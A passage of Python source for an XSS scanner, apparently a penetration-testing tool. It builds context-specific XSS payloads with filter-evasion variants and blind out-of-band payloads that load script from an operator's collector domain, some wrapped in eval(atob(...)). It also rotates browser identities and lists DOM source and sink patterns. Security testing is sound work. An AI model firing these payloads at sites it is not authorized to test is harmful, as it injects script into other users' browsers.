        if isinstance(data, dict):
            return (urllib.parse.urlencode(data).encode(),
                    "application/x-www-form-urlencoded", False)
        if isinstance(data, str):
            return data.encode(), None, False
        return data, None, False

    @staticmethod
    def _profile_headers(profile: dict) -> dict:
        return {k: v for k, v in profile.items()
                if k not in ("name", "hints")}

    def profile_for(self, url: str) -> dict:
        """The browser identity this host is being scanned as."""
        host = (urllib.parse.urlsplit(url).netloc or url).lower()
        with self._host_lock:
            prof = self._by_host.get(host)
            if prof is None:
                prof = self._profiles[self._rotation % len(self._profiles)]
                self._rotation += 1
                self._by_host[host] = prof
            return prof

    def headers_for(self, url: str) -> dict:
        """
        Every header this URL gets, resolved here rather than stored.

        A per-host table has to be CONSULTED per request, not written into a
        shared dict when a host starts: -l runs several hosts in parallel
        threads, and a mutation would hand one host another's session
        intermittently -- the very leak the table exists to prevent.

        Order, lowest first: defaults, the captured request, the browser
        profile, the auth file, -H. Cookie is the exception: it is merged
        cookie by cookie along that same order, so a TrackingId carried by a
        -r capture survives a session= supplied by an auth file instead of
        being replaced wholesale by it.
        """
        auth = self.auth.headers_for(url) if self.auth else {}
        pinned = self._explicit | {k.lower() for k in auth}

        headers = dict(FETCH_METADATA)
        headers["Connection"] = "close"
        headers.update(self.req_headers)

        profile = self.profile_for(url)
        prof = dict(self._profile_headers(profile))
        # Client hints go only to secure contexts, and only for the engines
        # that have them: putting Chromium's hints on a plain-http request, or
        # on a Firefox identity, is as anomalous as leaving them out of an
        # https one.
        if url.lower().startswith("https://"):
            prof.update(profile.get("hints") or {})
        for k, v in prof.items():
            if k.lower() not in pinned:
                headers[k] = v

        headers.update(auth)
        headers.update(self.cli_headers)

        jar = {}
        for src in (self.req_headers, auth, self.cli_headers):
            for k, v in src.items():
                if k.lower() == "cookie":
                    jar.update(parse_cookie_header(v))
        if jar:
            for k in [k for k in headers if k.lower() == "cookie"]:
                del headers[k]
            headers["Cookie"] = build_cookie_header(jar)
        return headers

    # Headers a capture carries that the BROWSER sets for itself. Replaying a
    # captured "Sec-Fetch-Dest: image" on a document navigation is both wrong
    # and conspicuous, and Chromium would be contradicting its own request.
    _BROWSER_MANAGED = frozenset({
        "sec-fetch-dest", "sec-fetch-mode", "sec-fetch-site", "sec-fetch-user",
        "upgrade-insecure-requests", "priority", "accept-encoding",
        "connection", "host", "content-length", "te",
    })

    def replay_headers_for(self, url: str) -> dict:
        """
        What the OPERATOR supplied for this URL, for a browser replay.

        Not headers_for(): that carries the rotating browser profile and its
        client hints, and forcing those onto Chromium makes it claim one
        identity in the User-Agent and another in the hints.

        And not -H alone, which is what the confirmer used to read. A session
        supplied by an auth file -- or captured with -r -- never reached the
        browser, so --confirm loaded the login page, saw no dialog and
        confirmed nothing, on a finding the HTTP layer had just proved. Same
        precedence and same per-cookie merge as headers_for.
        """
        out = {k: v for k, v in self.req_headers.items()
               if k.lower() not in self._BROWSER_MANAGED}
        auth = self.auth.headers_for(url) if self.auth else {}
        out.update(auth)
        out.update(self.cli_headers)

        jar = {}
        for src in (self.req_headers, auth, self.cli_headers):
            for k, v in src.items():
                if k.lower() == "cookie":
                    jar.update(parse_cookie_header(v))
        if jar:
            for k in [k for k in out if k.lower() == "cookie"]:
                del out[k]
            out["Cookie"] = build_cookie_header(jar)
        return out

    def header_for(self, url: str, name: str) -> str:
        """The value this URL currently carries for one header (append mode)."""
        want = name.lower()
        return next((v for k, v in self.headers_for(url).items()
                     if k.lower() == want), "")

    def request(self, url, method="GET", data=None, extra_headers=None) -> Response:
        self._throttle()
        headers = self.headers_for(url)
        if extra_headers:
            headers.update(extra_headers)

        body_bytes, ctype, force_ctype = self._encode_body(data)
        if ctype:
            if force_ctype:
                headers["Content-Type"] = ctype
            else:
                headers.setdefault("Content-Type", ctype)
        elif body_bytes is None:
            # A GET built from a captured POST must not keep announcing a body
            # it no longer carries.
            headers.pop("Content-Type", None)

        req = urllib.request.Request(url, data=body_bytes, method=method)
        for k, v in headers.items():
            req.add_header(k, v)

        started = time.time()
        with self._count_lock:
            self.count += 1
        try:
            with self._opener().open(req, timeout=self.timeout) as resp:
                raw = resp.read(MAX_BODY)
                charset = resp.headers.get_content_charset() or "utf-8"
                return Response(resp.geturl(), resp.status, dict(resp.headers),
                                raw.decode(charset, errors="replace"),
                                time.time() - started)
        except urllib.error.HTTPError as e:
            try:
                text = e.read(MAX_BODY).decode("utf-8", errors="replace")
            except Exception:
                text = ""
            return Response(url, e.code, dict(e.headers or {}), text,
                            time.time() - started)
        except Exception as e:  # timeouts, DNS, TLS, connection reset
            if self.reporter:
                self.reporter.debug(f"request failed {url}: {e}")
            return Response(url, 0, {}, "", time.time() - started, error=str(e))


# ----------------------------------------------------------------------------
# HTML parsing
# ----------------------------------------------------------------------------

class FormParser(HTMLParser):
    """Extracts forms, script sources and inline script bodies."""

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.forms: list[Form] = []
        self.scripts: list[str] = []       # external script src
        self.inline: list[str] = []        # inline script bodies
        self._current: Form | None = None
        self._in_script = False
        self._script_buf: list[str] = []

    def handle_starttag(self, tag, attrs):
        a = {k.lower(): (v or "") for k, v in attrs}
        if tag == "form":
            self._current = Form(action=a.get("action", ""),
                                 method=(a.get("method", "get") or "get").upper(),
                                 enctype=a.get("enctype",
                                               "application/x-www-form-urlencoded"))
        elif tag in ("input", "textarea", "select") and self._current is not None:
            name = a.get("name")
            if name:
                self._current.inputs[name] = a.get("value", "")
                self._current.types[name] = a.get("type", "text").lower()
        elif tag == "script":
            if a.get("src"):
                self.scripts.append(a["src"])
            else:
                self._in_script = True
                self._script_buf = []

    def handle_endtag(self, tag):
        if tag == "form" and self._current is not None:
            self.forms.append(self._current)
            self._current = None
        elif tag == "script" and self._in_script:
            self._in_script = False
            body = "".join(self._script_buf)
            if body.strip():
                self.inline.append(body)

    def handle_data(self, data):
        if self._in_script:
            self._script_buf.append(data)


def parse_page(html: str) -> FormParser:
    p = FormParser()
    try:
        p.feed(html)
        p.close()
    except Exception:
        pass  # malformed markup is normal in the wild - keep what we parsed
    return p


# ----------------------------------------------------------------------------
# Context analysis
# ----------------------------------------------------------------------------

class Doc:
    """
    A response body plus its lowercased twin.

    detect_context needs case-insensitive backward searches from an arbitrary
    offset. Lowercasing here once and using bounded str.rfind/find avoids the
    slice-and-lower of everything before the offset that would otherwise happen
    on every reflection - quadratic on a large page with several reflections.
    """

    __slots__ = ("body", "low")

    def __init__(self, body: str):
        self.body = body
        self.low = body.lower()


def _quote_state(segment: str) -> str | None:
    """Return the quote char we are currently inside of, or None."""
    quote = None
    for ch in segment:
        if quote:
            if ch == quote:
                quote = None
        elif ch in "\"'`":
            quote = ch
    return quote


def detect_context(doc: Doc, idx: int) -> tuple[str, str | None, str]:
    """
    Classify where offset `idx` lands in the document.
    Returns (context, quote_char, detail).
    """
    body, low = doc.body, doc.low

    open_script = low.rfind("<script", 0, idx)
    if open_script > low.rfind("</script", 0, idx):
        gt = low.find(">", open_script, idx)
        seg = body[gt + 1:idx] if gt != -1 else ""
        q = _quote_state(seg)
        if q:
            return "script-string", q, f"inside JS string delimited by {q}"
        return "script", None, "inside <script> block (raw JS)"

    if low.rfind("<style", 0, idx) > low.rfind("</style", 0, idx):
        return "style", None, "inside <style> block"

    if low.rfind("<textarea", 0, idx) > low.rfind("</textarea", 0, idx):
        return "textarea", None, "inside <textarea> (needs </textarea> breakout)"

    if body.rfind("<!--", 0, idx) > body.rfind("-->", 0, idx):
        return "comment", None, "inside an HTML comment"

    lt = body.rfind("<", 0, idx)
    if lt > body.rfind(">", 0, idx):
        seg = body[lt:idx]
        q = _quote_state(seg)
        m = re.search(r"([\w:-]+)\s*=\s*[\"'`]?[^\"'`=]*$", seg)
        attr = m.group(1).lower() if m else ""
        tagm = re.match(r"<\s*([\w:-]+)", seg)
        tag = tagm.group(1).lower() if tagm else ""
        if attr in ("href", "src", "action", "formaction", "data", "poster",
                    "xlink:href"):
            return "url-attribute", q, f"<{tag} {attr}=...> URL sink"
        if attr.startswith("on"):
            return "event-attribute", q, f"<{tag} {attr}=...> event handler"
        if attr:
            return "attribute", q, (f"<{tag} {attr}=...> "
                                    f"{'quoted with ' + q if q else 'unquoted'}")
        return "tag", q, f"inside <{tag}> tag body (attribute name position)"

    return "html", None, "HTML element content"


def analyze_reflection(doc: Doc, token: str) -> list[dict]:
    """
    Find every reflection of the probe and report the surviving characters
    plus the surrounding context.
    """
    body = doc.body
    results = []
    marker = re.escape(token)
    for m in re.finditer(marker + r"(.{0,80}?)" + marker, body, re.S):
        middle = m.group(1)
        ctx, quote, detail = detect_context(doc, m.start())
        results.append({"index": m.start(),
                        "survived": {c for c in PROBE_CHARS if c in middle},
                        "context": ctx, "quote": quote, "detail": detail,
                        "raw": middle})
    if not results:
        # token echoed but the probe chars were stripped/encoded away entirely
        m = re.search(marker, body)
        if m:
            ctx, quote, detail = detect_context(doc, m.start())
            results.append({"index": m.start(), "survived": set(), "context": ctx,
                            "quote": quote, "detail": detail, "raw": ""})
    return results


# ----------------------------------------------------------------------------
# Payloads
# ----------------------------------------------------------------------------

def wrap_note(sent: str, payload: str) -> str:
    """How the payload sits inside what was actually sent.

    Not always a suffix. A filename keeps its extension, so the payload lands
    in the middle, and reporting "appended to current value 'test<svg'" --
    the old suffix arithmetic, cutting the payload itself in half -- described
    a request that was never sent.
    """
    i = sent.find(payload)
    if i < 0:
        return ""
    pre, post = sent[:i], sent[i + len(payload):]
    if pre and post:
        return f"placed between {pre!r} and {post!r}"
    if pre:
        return f"appended to current value {pre!r}"
    if post:
        return f"prefixed to {post!r}"
    return ""


def rand_token(n=8) -> str:
    return "zq" + "".join(random.choices(string.ascii_lowercase + string.digits,
                                         k=n - 2))


def probe_value(token: str, chars: str = PROBE_CHARS) -> str:
    return f"{token}{chars}{token}"


def _b64(s: str) -> str:
    return base64.b64encode(s.encode()).decode()


def payloads_for(context: str, quote: str | None, token: str) -> list[tuple[str, str]]:
    """
    Return [(payload, required_chars)] tailored to the reflection context.
    `required_chars` are the characters that must survive raw for it to fire.
    """
    mark = f"alert('{token}')"
    q = quote or '"'

    generic_html = [
        (f"<svg/onload={mark}>", "<>"),
        (f"<img src=x onerror={mark}>", "<>"),
        (f"<script>{mark}</script>", "<>"),
        (f"<details/open/ontoggle={mark}>", "<>"),
        (f"<iframe srcdoc=\"&lt;script&gt;{mark}&lt;/script&gt;\">", "<>\""),
        (f"<body onload={mark}>", "<>"),
        (f"<x onmouseover={mark}>hover", "<>"),
        # filter-evasion variants
        (f"<svg><script>{mark}</script>", "<>"),
        (f"<img src=x onerror=\u0061lert`{token}`>", "<>`"),
        (f"<sVg/OnLoad={mark}>", "<>"),
        # alternative tags/handlers (PayloadsAllTheThings) - reached only when
        # the earlier payloads are filtered, which is exactly when they matter
        (f"<marquee onstart={mark}>", "<>"),
        (f"<video><source onerror={mark}>", "<>"),
        (f"<audio src onerror={mark}>", "<>"),
        (f"<select autofocus onfocus={mark}>", "<>"),
        (f"<input autofocus onfocus={mark}>", "<>"),
        (f"<keygen autofocus onfocus={mark}>", "<>"),
        (f"<svg><animate onbegin={mark} attributeName=x dur=1s>", "<>"),
        (f"<img/src/onerror={mark}>", "<>/"),
        (f"<ScRiPt>{mark}</ScRiPt>", "<>"),
    ]

    if context == "html":
        return generic_html
    if context == "textarea":
        return [(f"</textarea><svg/onload={mark}>", "<>/"),
                (f"</textarea><script>{mark}</script>", "<>/")] + generic_html[:3]
    if context == "comment":
        return [(f"--><svg/onload={mark}>", "<>-"),
                (f"--!><script>{mark}</script>", "<>-")]
    if context == "style":
        return [(f"</style><svg/onload={mark}>", "<>/"),
                (f"</style><script>{mark}</script>", "<>/")]
    if context in ("attribute", "url-attribute", "event-attribute", "tag"):
        out = []
        if context == "url-attribute":
            out += [(f"javascript:{mark}", ":"),
                    (f"javas\tcript:{mark}", ":"),
                    (f"javas\ncript:{mark}", ":"),
                    ("data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+", ":"),
                    (f"jaVasCript:{mark}", ":")]
        if context == "event-attribute":
            out += [(f"{q};{mark};//", q + ";"),
                    (f"';{mark};//", "';"),
                    (f"-{mark}-", "-")]
        if quote:
            out += [
                (f"{q} onmouseover={mark} x={q}", q),
                (f"{q} autofocus onfocus={mark} x={q}", q),
                (f"{q}><svg/onload={mark}>", q + "<>"),
                (f"{q}><img src=x onerror={mark}>", q + "<>"),
                (f"{q} onfocus={mark} autofocus tabindex=1 {q}", q),
            ]
        else:
            out += [
                (f" onmouseover={mark} ", " ="),
                (f" autofocus onfocus={mark} ", " ="),
                (f"><svg/onload={mark}>", "<>"),
                (f"/onmouseover={mark}", "/="),
            ]
        out += [(f"\"><svg/onload={mark}>", "\"<>"),
                (f"'><svg/onload={mark}>", "'<>")]
        return out
    if context == "script-string":
        return [
            (f"{q};{mark};//", q + ";"),
            (f"{q};{mark};var x={q}", q + ";"),
            (f"\\{q};{mark};//", q + ";\\"),
            (f"</script><svg/onload={mark}>", "<>/"),
            (f"{q}-{mark}-{q}", q + "-"),
            (f"{q}}}));{mark};//", q + ");"),
        ]
    if context == "script":
        return [
            (f";{mark};", ";"),
            (f"{mark}", "()"),
            (f"</script><svg/onload={mark}>", "<>/"),
            (f"*/{mark};/*", "*/"),
        ]
    return generic_html


def is_standalone(payload: str) -> bool:
    """
    URL-scheme payloads only execute when they own the whole value: appending
    'javascript:alert(1)' to 'http://x' yields an inert relative URL.  These are
    sent on their own even in append mode.
    """
    flat = re.sub(r"\s+", "", payload).lower()
    return flat.startswith(("javascript:", "data:", "vbscript:"))


BLIND_LABEL = "xss-"       # every callback hostname starts with this


def blind_tag(n: int = 6) -> str:
    """A DNS-label-safe canary: lowercase alphanumerics, no separators."""
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def blind_collector(callback: str) -> tuple[str, str, str]:
    """
    Split -b into (scheme, domain, port).

    -b carries the OOB *domain*, optionally with a scheme and a port. An empty
    scheme means "mirror the target" - see blind_scheme():
      meoob.cc          -> ("",      "meoob.cc", "")
      https://meoob.cc  -> ("https", "meoob.cc", "")
      http://meoob.cc   -> ("http",  "meoob.cc", "")
      meoob.cc:8080     -> ("",      "meoob.cc", "8080")
    """
    raw = (callback or "").strip().rstrip("/")
    scheme = ""
    if "://" in raw:
        scheme, _, raw = raw.partition("://")
    elif raw.startswith("//"):
        scheme, raw = "", raw[2:]
    raw = raw.split("/", 1)[0]
    domain, _, port = raw.partition(":")
    return scheme.lower(), domain.lower().strip("."), port


def blind_scheme(callback: str, target_url: str, force_ssl: bool = False) -> str:
    """
    The scheme the OOB payloads use for one target.

    Mirroring the target is what actually gets the callback out: http:// on an
    https page is dropped as active mixed content, and https:// needs a
    certificate valid for xss-*.<domain>, which a wildcard collector may not
    have. The page itself already answers which one works.

    --force-ssl wins, then an explicit scheme in -b, then the target.
    """
    if force_ssl:
        return "https"
    explicit = blind_collector(callback)[0]
    if explicit:
        return explicit
    return "https" if target_url.lower().startswith("https://") else "http"


def blind_authority(callback: str, tag: str) -> str:
    """xss-<tag>.<oob domain>[:port] - the hostname a callback arrives on."""
    _, domain, port = blind_collector(callback)
    return f"{BLIND_LABEL}{tag}.{domain}" + (f":{port}" if port else "")


def blind_cert_ok(domain: str, port: int = 443, timeout: float = 4.0):
    """
    Does a real browser accept your collector's certificate for xss-*.<domain>?

    True / False / None when it cannot be told (no DNS, no route, no listener -
    all of which say nothing about the certificate). Only a verification
    failure answers False, so a collector that is simply unreachable from the
    scanning host is never accused of having a bad certificate.

    This matters because the replay context runs with ignore_https_errors (the
    target may well have a self-signed certificate, and losing a real finding
    over that would be worse). A victim's browser does not ignore it: measured
    here, an invalid certificate stops the callback at ERR_CERT_AUTHORITY_INVALID
    *after* the name is resolved - your DNS log fills up and your HTTP log
    stays empty, which is indistinguishable from a broken collector.
    """
    host = f"{BLIND_LABEL}certprobe.{domain}"
    ctx = ssl.create_default_context()
    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            with ctx.wrap_socket(sock, server_hostname=host):
                return True
    except ssl.SSLCertVerificationError:
        return False
    except Exception:
        return None


def blind_payloads(callback: str, tag: str, scheme: str = "https") -> list[str]:
    """
    OOB payloads. `tag` identifies the injection point, and it travels in the
    *hostname* (xss-<tag>.<domain>), not in a path: a wildcard collector can
    then attribute a hit from the DNS query alone, with no HTTP needed.

    `scheme` comes from blind_scheme() - the target's own, unless -b or
    --force-ssl says otherwise. One protocol-relative shape is kept at the end
    as a cheap second chance: if the payload ends up rendered on a page served
    over the other scheme, that one follows it there.
    """
    authority = blind_authority(callback, tag)
    hook = f"{scheme}://{authority}" if scheme else f"//{authority}"
    rel = f"//{authority}"
    js = (f"var s=document.createElement('script');s.src='{hook}';"
          f"document.body.appendChild(s)")
    # The trailing paths are cosmetic now that the tag is in the host - they
    # name the payload shape in the collector's HTTP log.
    return [
        f'"><script src={hook}></script>',
        f"'><script src={hook}></script>",
        f"<script src={hook}></script>",
        f'"><svg onload="{js}">',
        f"<img src=x onerror=\"{js}\">",
        f'"><img src={hook}/i.png>',
        f'<iframe src="{hook}/if"></iframe>',
        f"javascript:eval(atob('{_b64(js)}'))",
        f"</script><script src={hook}></script>",
        f"\"><input onfocus=\"{js}\" autofocus>",
        f"<x onload=\"{js}\">",
        f"'-eval(atob('{_b64(js)}'))-'",
        f'"><link rel=stylesheet href={hook}/c.css>',
        f'"><script src={rel}></script>',
    ]


# ----------------------------------------------------------------------------
# DOM analysis
# ----------------------------------------------------------------------------

DOM_SOURCES = [
    r"location\s*\.\s*hash", r"location\s*\.\s*search", r"location\s*\.\s*href",
    r"document\s*\.\s*URL", r"document\s*\.\s*documentURI", r"document\s*\.\s*baseURI",
    r"document\s*\.\s*referrer", r"window\s*\.\s*name", r"location\s*\.\s*pathname",
    r"\blocation\b(?!\s*\.\s*(?:reload|replace|assign)\b)",
    r"addEventListener\s*\(\s*[\"']message[\"']", r"\bonmessage\b",
    r"sessionStorage\s*\.\s*getItem", r"localStorage\s*\.\s*getItem",
    r"URLSearchParams\s*\(",
]

DOM_SINKS = [
    r"\.innerHTML\s*=", r"\.outerHTML\s*=", r"insertAdjacentHTML\s*\(",
    r"document\s*\.\s*write(?:ln)?\s*\(", r"\beval\s*\(", r"\bnew\s+Function\s*\(",
    r"setTimeout\s*\(\s*[\"'`]?[^,)]*[\"'`]?\s*,", r"setInterval\s*\(\s*[\"'`]",
    r"\$\s*\(\s*[^)]*(?:location|hash|search|URL)", r"\.html\s*\(",
    r"\.append\s*\(", r"\.after\s*\(", r"\.before\s*\(", r"\.replaceWith\s*\(",
    r"\.setAttribute\s*\(\s*[\"'](?:src|href|on\w+)[\"']",
    r"location\s*\.\s*(?:href|replace|assign)\s*[=(]",
    r"\.srcdoc\s*=", r"execScript\s*\(", r"\.src\s*=",
    r"dangerouslySetInnerHTML", r"v-html", r"\.createContextualFragment\s*\(",
]

# Compiled once at import: these run over every inline block and every fetched
# script, so recompiling per call was pure overhead.
_DOM_SOURCE_RX = [re.compile(p) for p in DOM_SOURCES]
_DOM_SINK_RX = [re.compile(p) for p in DOM_SINKS]

DOM_NEAR = 400   # a source within this many chars of a sink is worth flagging

# A failed request that actually reached the network stack (DNS, refusal,
# timeout) versus one the browser itself refused to issue. See Confirmer._replay.
_NET_FAILURE_RX = re.compile(r"net::ERR_(?!BLOCKED_BY)", re.I)

# Once one payload has proven execution without reaching the collector, how many
# payload shapes in total to replay while hoping for one that actually lands.
_BLIND_TRIES_AFTER_SENT = 6


def scan_dom(js: str) -> list[tuple[str, str, str]]:
    """Return [(source, sink, snippet)] for source/sink pairs found near each other."""
    src_pos = [(m.start(), m.group(0))
               for rx in _DOM_SOURCE_RX for m in rx.finditer(js)]
    if not src_pos:
        return []

    seen, out = set(), []
    for rx in _DOM_SINK_RX:
        for m in rx.finditer(js):
            near = next((s for s in src_pos if abs(s[0] - m.start()) < DOM_NEAR),
                        None)
            if not near:
                continue
            key = (near[1], m.group(0))
            if key in seen:
                continue
            seen.add(key)
            start = max(0, m.start() - 90)
            snippet = re.sub(r"\s+", " ", js[start:m.start() + 110]).strip()
            out.append((near[1], m.group(0), snippet))
    return out


# ----------------------------------------------------------------------------
# URL helpers
# ----------------------------------------------------------------------------

def set_query_param(url: str, param: str, value: str) -> str:
    parts = urllib.parse.urlsplit(url)
    qs = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    new, found = [], False
    for k, v in qs:
        if k == param:
            new.append((k, value))
            found = True
        else:
            new.append((k, v))
    if not found:
        new.append((param, value))
    query = urllib.parse.urlencode(new, quote_via=urllib.parse.quote)
    return urllib.parse.urlunsplit((parts.scheme, parts.netloc, parts.path,
                                    query, parts.fragment))


def path_segments(url: str) -> list[str]:
    return [s for s in urllib.parse.urlsplit(url).path.split("/") if s]


# XSS/HTML metacharacters are kept RAW in path segments. A server that reflects
# the raw request path (without URL-decoding it first) only shows '<' when it
# received a literal '<' - percent-encoding it to %3C would be reflected as
# "%3C" and the reflection would look filtered, masking a real vulnerability
# (e.g. /verbe/aaaaaa<svg/onload=...>). We still let quote() encode space, %, #,
# ? and control/non-ASCII bytes, which would otherwise break the request line.
_PATH_SAFE = "/<>\"'`(){}[];:=,.!$*-_~"


def set_path_segment(url: str, index: int, value: str) -> str:
    """
    Replace segment `index` of the path with `value`, or append it as a new
    trailing segment when index == len(segments).  Only the injected segment
    is (minimally) encoded - the others are left exactly as they arrived, so we
    never double-encode the rest of the path.
    """
    parts = urllib.parse.urlsplit(url)
    segs = [s for s in parts.path.split("/") if s]
    encoded = urllib.parse.quote(value, safe=_PATH_SAFE)
    if index >= len(segs):
        segs.append(encoded)
        trailing = False
    else:
        segs[index] = encoded
        trailing = parts.path.endswith("/")
    path = "/" + "/".join(segs) + ("/" if trailing else "")
    return urllib.parse.urlunsplit((parts.scheme, parts.netloc, path,
                                    parts.query, parts.fragment))


# ----------------------------------------------------------------------------
# Injection point
# ----------------------------------------------------------------------------

@dataclass
class Point:
    """
    One place a payload can go.

    Collapsing the (param, data, header, path_index) tuple that used to be
    threaded through eight methods into a single object removes the repeated
    four-branch dispatch and makes each call site say what it means.
    """
    url: str
    param: str | None = None
    method: str = "GET"
    data: dict | None = None
    header: str | None = None
    path_index: int | None = None
    # One cookie carries the payload while `jar` replays the others untouched:
    # dropping a session cookie alongside it would cost the access the
    # reflection needs.
    cookie: str | None = None
    jar: dict | None = None
    # A JSON body travels as a TREE, not as a flat dict: the injection point
    # is a leaf identified by its path, and the body is rebuilt around it.
    json_body: object = None
    json_path: str | None = None
    json_name: bool = False     # inject into the KEY rather than the value
    inject_name: bool = False   # same idea for a query/body parameter name
    # A multipart body travels as a LIST OF PARTS, not as a flat dict: the
    # bytes and the filename have no representation in one. `param` names the
    # part; the payload goes in its value, its name (inject_name) or its
    # filename.
    parts: tuple | None = None
    part_filename: bool = False     # inject into the filename, a name like any other
    boundary: str | None = None     # celui de la capture, conservé tel quel

    @property
    def is_name_point(self) -> bool:
        """This point carries the payload in an input's NAME, not its value.

        One predicate rather than a json_name test, because --test-param-name
        covers JSON keys, form fields and multipart part names and they must
        all answer the same way.
        """
        return self.json_name or self.inject_name

    @property
    def kind(self) -> str:
        if self.json_path is not None:
            return "json"
        if self.path_index is not None:
            return "path"
        if self.cookie:
            return "cookie"
        if self.header:
            return "header"
        if self.method == "POST":
            return "body"
        return "query"

    @property
    def name(self) -> str:
        if self.json_path is not None:
            # When the tree lives inside a query parameter, the parameter is
            # half the address: "q" alone does not say where to look.
            base = (f"{self.param}:{self.json_path}" if self.param
                    else self.json_path)
            return base + (" (key)" if self.json_name else "")
        if self.path_index is not None:
            return f"path[{self.path_index}]"
        base = self.cookie or self.header or self.param or "-"
        if self.part_filename:
            return base + " (filename)"
        return base + (" (name)" if self.inject_name else "")

    def label(self) -> str:
        if self.json_path is not None:
            what = "key name" if self.json_name else "value"
            where = f"JSON in {self.param}" if self.param else "JSON body"
            return f"{self.json_path} ({where}, {what})"
        if self.parts is not None:
            what = ("part name" if self.inject_name else
                    "filename" if self.part_filename else "part value")
            return f"{self.param} (multipart {what})"
        if self.inject_name:
            where = "body field name" if self.method == "POST" else "parameter name"
            return f"{self.param} ({where})"
        if self.path_index is not None:
            nsegs = len(path_segments(self.url))
            return ("path[+] appended segment" if self.path_index >= nsegs
                    else f"path[{self.path_index}] segment")
        if self.cookie:
            return f"{self.cookie} (cookie)"
        if self.header:
            return f"{self.header} (header)"
        return f"{self.param} ({'body' if self.method == 'POST' else 'query'})"


# ----------------------------------------------------------------------------
# SQL error watcher
# ----------------------------------------------------------------------------

class SqlWatcher:
    """
    Notices database errors surfacing in responses.

    XSS payloads carry quotes, so a broken SQL string shows up often while
    testing. Kept separate from the scanner because it owns its own dedup and
    baseline state.
    """

    def __init__(self, reporter: Reporter, enabled=True):
        self.rep = reporter
        self.enabled = enabled
        self.alerted: set = set()          # (path, param) already reported
        self.baseline: dict[str, set] = {}  # path -> DBMS errors present pre-injection
        self._lk = threading.Lock()

    @staticmethod
    def _match(doc: Doc):
        """First matching signature, or None. Cheap substring gate first."""
        if not any(h in doc.low for h in SQL_HINTS):
            return None
        for dbms, rx in SQL_ERRORS:
            m = rx.search(doc.body)
            if m:
                return dbms, m
        return None

    def learn_baseline(self, url: str, resp: Response) -> set:
        """Record which DBMS errors a page leaks before we inject anything."""
        path = urllib.parse.urlsplit(url).path
        found = set()
        if any(h in resp.doc.low for h in SQL_HINTS):
            found = {d for d, rx in SQL_ERRORS if rx.search(resp.body)}
        with self._lk:
            self.baseline[path] = found
        return found

    def check(self, resp: Response, url, param="-", location="query",
              method="GET", payload="", poc="") -> Finding | None:
        """
        Return a Finding when a database error surfaces, else None.

        Signatures run most-specific first and only the first match is reported,
        once per (path, parameter), so a payload sweep doesn't spam.
        """
        if not self.enabled or not resp.ok or not resp.body:
            return None
        hit = self._match(resp.doc)
        if not hit:
            return None
        dbms, m = hit

        path = urllib.parse.urlsplit(url).path
        key = (path, param)
        pre_existing = dbms in self.baseline.get(path, set())

        if pre_existing and location != "baseline":
            # Already alerted for this page without any payload - don't raise it
            # again for every parameter we touch. Deliberately does NOT consume
            # the dedup key: a different, payload-induced DBMS error on this same
            # parameter still deserves an alert later.
            self.rep.info(f"{dbms} error on {param} is pre-existing on {path} "
                          f"- not re-alerting")
            return None

        with self._lk:
            if key in self.alerted:
                return None
            self.alerted.add(key)

        start = max(0, m.start() - 60)
        snippet = re.sub(r"\s+", " ", resp.body[start:m.end() + 120]).strip()
        note = ("present without any payload - pre-existing error page, "
                "not necessarily injectable" if pre_existing else
                "error appeared under injection - test this parameter for SQLi")
        return Finding(
            kind=f"SQL error disclosed ({dbms})",
            url=url, param=param, location=location, method=method,
            context=note,
            payload=payload or "(no payload - baseline response)",
            evidence=snippet[:240], poc=poc, confidence="alert")


# ----------------------------------------------------------------------------
# Scanner
# ----------------------------------------------------------------------------

class LogWatcher:
    """
    Watches your own collector's logs for the tokens planted this run.

    A line in your DNS or HTTP log is the strongest result this tool can
    produce: the browser that fired the payload was not ours, and
    xss-<token>.<domain> exists nowhere else on the internet. It confirms a
    genuinely blind injection - one that reflects nothing, that our replay
    could never reach, that fired in an admin's session an hour later.

    Files are read incrementally (only the bytes appended since the last pass,
    from the size they had at startup - a token minted this run cannot appear
    before it), and matched case-insensitively: resolvers randomise the case of
    query names (DNS 0x20 encoding), so xss-3adix2 can reach the log as
    xSs-3aDiX2.
    """

    INTERVAL = 5.0          # seconds between passes while the scan runs
    SETTLE = 3.0            # grace before the final pass, for late callbacks

    def __init__(self, args, rep: "Reporter", scanner: "Scanner"):
        self.args = args
        self.rep = rep
        self.scanner = scanner
        self.sources = [(kind, path) for kind, path in
                        (("DNS", getattr(args, "dns_log", None)),
                         ("HTTP", getattr(args, "http_log", None))) if path]
        self.enabled = bool(self.sources) and bool(getattr(args, "blind", ""))
        self.offsets: dict[str, int] = {}
        self.seen: set = set()          # (tag, kind) already reported
        self._stop = threading.Event()
        self._thread = None
        self._lk = threading.Lock()

    # -- lifecycle -----------------------------------------------------------

    def start(self):
        if not self.enabled:
            return
        for kind, path in self.sources:
            try:
                # Start from the end: anything matching has to be written after
                # the token exists, and a resolver log can be gigabytes.
                self.offsets[path] = os.path.getsize(path)
            except OSError as e:
                self.offsets[path] = 0
                self.rep.warn(f"{kind} log {path}: {e} - surveillé quand même "
                              f"au cas où il apparaîtrait")
            else:
                self.rep.info(f"{kind} log: {path} "
                              f"(à partir de {self.offsets[path]} octets)")
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def _loop(self):
        while not self._stop.wait(self.INTERVAL):
            try:
                self.check()
            except Exception as e:
                self.rep.debug(f"log watch error: {e}")

    def stop(self):
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=5)

    def final(self):
        """Last pass, after a grace period - a callback can lag the request."""
        if not self.enabled:
            return 0
        self.rep.line(f"\nrelecture de "
                      f"{', '.join(p for _, p in self.sources)} pour les "
                      f"tokens encore en attente...")
        time.sleep(self.SETTLE)
        return self.check()

    # -- reading -------------------------------------------------------------

    def _new_text(self, path: str) -> str:
        """Bytes appended since the last pass, cut at the last complete line."""
        try:
            size = os.path.getsize(path)
        except OSError:
            return ""
        start = self.offsets.get(path, 0)
        if size < start:              # rotated or truncated: start over
            start = 0
        if size <= start:
            return ""
        try:
            with open(path, "rb") as fh:
                fh.seek(start)
                raw = fh.read(size - start)
        except OSError as e:
            self.rep.warn(f"lecture de {path} impossible: {e}")
            return ""
        cut = raw.rfind(b"\n")
        if cut == -1:
            return ""                 # a partial line: leave it for next pass
        self.offsets[path] = start + cut + 1
        return raw[:cut].decode("utf-8", "replace")

    # -- matching ------------------------------------------------------------

    def check(self) -> int:
